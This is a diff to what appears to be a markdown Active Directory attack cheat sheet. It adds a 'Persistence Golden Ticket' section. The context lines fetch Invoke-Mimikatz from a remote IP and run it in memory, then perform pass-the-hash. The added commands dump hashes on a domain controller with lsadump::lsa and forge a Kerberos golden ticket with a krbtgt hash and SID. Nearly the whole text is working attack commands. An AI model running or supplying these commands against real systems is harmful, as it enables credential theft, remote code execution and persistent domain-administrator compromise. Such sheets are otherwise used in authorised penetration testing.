@@ -200,4 +200,10 @@ Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName xxxx.corpor
 iex (iwr http://xxx.xxx.xxx.xxx/Invoke-Mimikatz.ps1 -UseBasicParsing)                                           #Execute Invoke-Mimikatz from computer xxx.xxx.xxx.xxx
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:admin /domain:corporate.corp.local /ntlm:x /run:powershell.exe"' #"Over pass the hash" generate tokens from hashes
 ```
+# Persistence Golden Ticket
 
+- **Invoke-Mimikatz:**
+```
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'                                                                #Execute mimikatz on DC as DA to get hashes
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corporate.corp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /krbtgt:0c88028bf3aa6a6a143ed846f2be1ea4 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'    #Golden Ticket
+```
